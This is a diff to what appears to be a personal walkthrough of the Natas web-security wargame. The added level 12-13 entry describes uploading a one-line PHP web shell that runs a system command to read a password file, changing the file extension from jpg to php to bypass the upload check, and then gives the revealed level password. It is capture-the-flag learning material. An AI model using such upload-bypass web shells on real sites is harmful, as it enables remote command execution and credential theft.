@@ -149,4 +149,14 @@ level>>11-12 : > open the url in the browser.
 
 level>>12-13 : > open the url in the browser.
                > enter the username and pass.
-               > 
+               > create a php file,
+                    <?php echo system('cat /etc/natas_webpass/natas13'); ?>
+               > upload this file .
+               > inspect and resend it by changing jpg to php .
+               > get the password.
+
+                      Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+level>>13-14 :  > open the url in the browser.
+                > enter the username and pass.
+                
